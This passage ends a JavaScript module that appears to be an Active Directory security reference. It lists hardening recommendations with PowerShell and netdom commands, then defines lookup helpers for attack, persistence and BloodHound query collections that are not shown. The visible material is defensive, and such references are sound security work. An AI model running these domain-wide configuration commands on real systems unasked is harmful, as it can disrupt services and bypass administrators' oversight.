    implementation: "Create KDS Root Key: Add-KdsRootKey -EffectiveImmediately. Create gMSA: New-ADServiceAccount -Name svc_app -DNSHostName svc_app.domain.local -PrincipalsAllowedToRetrieveManagedPassword 'ServerGroup'. Install on target: Install-ADServiceAccount -Identity svc_app. Configure service to run as DOMAIN\\svc_app$.",
    priority: "medium"
  },
  {
    recommendation: "Enable Advanced Audit Policies",
    description: "Configure granular audit policies to detect AD attacks: logon events, directory service access, Kerberos operations, privilege use, and object access.",
    implementation: "GPO: Computer Configuration > Policies > Windows Settings > Security Settings > Advanced Audit Policy Configuration. Enable: Logon/Logoff (Success/Failure), Account Logon (Success/Failure), DS Access (Success/Failure), Object Access (Success), Privilege Use (Success/Failure). Configure SACL on sensitive AD objects (AdminSDHolder, Domain root, GPOs). Ship logs to SIEM.",
    priority: "medium"
  },
  {
    recommendation: "Restrict Delegation for Privileged Accounts",
    description: "Mark all privileged accounts as 'Account is sensitive and cannot be delegated' and add them to Protected Users group to prevent delegation-based attacks.",
    implementation: "Set flag on accounts: Set-ADUser -Identity admin -AccountNotDelegated $true. Add to Protected Users: Add-ADGroupMember 'Protected Users' admin. Review all delegation configurations: Get-ADComputer -Filter {TrustedForDelegation -eq $true}. Remove unnecessary delegation. Convert unconstrained to constrained where needed.",
    priority: "medium"
  },
  {
    recommendation: "Harden Domain Controllers",
    description: "Apply security hardening to all domain controllers: minimize installed roles, restrict network access, disable unnecessary services, and implement host-based monitoring.",
    implementation: "Install only AD DS and DNS roles on DCs. Disable Print Spooler: Stop-Service Spooler; Set-Service Spooler -StartupType Disabled. Restrict RDP to PAWs only. Enable Windows Firewall with restrictive rules. Disable SMBv1. Enable PowerShell logging (ScriptBlockLogging, ModuleLogging, Transcription). Deploy EDR. Restrict who can log on locally.",
    priority: "medium"
  },
  {
    recommendation: "Monitor and Restrict ACLs on Critical Objects",
    description: "Regularly audit ACLs on critical AD objects (domain root, AdminSDHolder, DC objects, privileged groups, GPOs) and remove unnecessary permissions.",
    implementation: "Run BloodHound for ACL analysis. Use ADRecon or custom scripts to baseline ACLs. Monitor Event ID 5136 (directory object modified) and 4662 (object access). Alert on ACL changes to privileged objects. Remove GenericAll/WriteDacl/WriteOwner from non-admin principals on critical objects. Implement a quarterly ACL review process.",
    priority: "medium"
  },
  {
    recommendation: "Enable SID Filtering on Domain Trusts",
    description: "Enable SID filtering on external and forest trusts to prevent SID History injection attacks from compromised trusted domains.",
    implementation: "Verify SID filtering: netdom trust domain.local /domain:trusted.local /quarantine. Enable filtering: netdom trust domain.local /domain:trusted.local /quarantine:Yes. For forest trusts, SID filtering is enabled by default. For external trusts, verify explicitly. Exception: migration scenarios may temporarily require SID History. Re-enable filtering after migration.",
    priority: "medium"
  }
];

// ---------------------------------------------------------------------------
// Helper: look up by name (case-insensitive partial match)
// ---------------------------------------------------------------------------

function findByName(collection, query) {
  const q = String(query).toLowerCase();
  return collection.filter(
    (item) => item.name.toLowerCase().includes(q) || (item.description && item.description.toLowerCase().includes(q))
  );
}

function getEnumerationByTool(toolName) {
  const t = String(toolName).toLowerCase();
  return AD_ENUMERATION.filter((e) => e.tool.toLowerCase().includes(t));
}

function getAttacksByTool(toolName) {
  const t = String(toolName).toLowerCase();
  return AD_ATTACKS.filter((a) => a.tools.some((tool) => tool.toLowerCase().includes(t)));
}

function getHardeningByPriority(priority) {
  const p = String(priority).toLowerCase();
  return AD_HARDENING.filter((h) => h.priority === p);
}

function getAttackChain(attackNames) {
  return attackNames
    .map((name) => AD_ATTACKS.find((a) => a.name.toLowerCase() === name.toLowerCase()))
    .filter(Boolean);
}

function summarize() {
  return {
    enumerationTechniques: AD_ENUMERATION.length,
    attackTechniques: AD_ATTACKS.length,
    persistenceMechanisms: AD_PERSISTENCE.length,
    tools: AD_TOOLS.length,
    bloodhoundQueries: BLOODHOUND_QUERIES.length,
    hardeningRecommendations: AD_HARDENING.length,
    total:
      AD_ENUMERATION.length +
      AD_ATTACKS.length +
      AD_PERSISTENCE.length +
      AD_TOOLS.length +
      BLOODHOUND_QUERIES.length +
      AD_HARDENING.length,
  };
}

// ---------------------------------------------------------------------------
// Exports
// ---------------------------------------------------------------------------

module.exports = {
  AD_ENUMERATION,
  AD_ATTACKS,
  AD_PERSISTENCE,
  AD_TOOLS,
  BLOODHOUND_QUERIES,
  AD_HARDENING,
  findByName,
  getEnumerationByTool,
  getAttacksByTool,
  getHardeningByPriority,
  getAttackChain,
  summarize,
};
